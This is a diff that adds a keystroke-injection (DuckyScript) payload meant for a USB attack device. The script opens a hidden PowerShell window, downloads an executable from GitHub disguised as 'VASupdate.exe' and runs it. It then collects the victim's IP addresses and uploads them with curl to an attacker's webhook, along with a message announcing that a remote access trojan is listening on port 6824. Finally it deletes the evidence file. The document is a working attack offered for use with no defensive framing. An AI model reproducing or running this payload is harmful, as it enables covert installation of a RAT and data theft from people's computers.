@@ -1,0 +1,22 @@
+REM Author: sysgerm @ CosmodiumCS
+GUI r
+DELAY 500
+STRING powershell.exe -WindowStyle hidden -C cd C:\\Windows\Temp; Invoke-Webrequest -Uri 'https://github.com/sysgerm/FlipTheScripts/blob/main/resources/app.exe?raw=true' -OutFile VASupdate.exe; .\VASupdate.exe
+ENTER
+TAB
+ENTER
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 500
+STRING ipconfig | findstr /C:Address > ip.txt
+ENTER
+STRING curl.exe -F "payload_json={\"username\": \"Ratted\", \"content\": \"**Target connected to RAT use port 6824 to connect**\"}" -F "file=@ip.txt" YOUR WEBHOOK
+ENTER
+STRING del ip.txt
+ENTER
+STRING exit
+ENTER
+
+
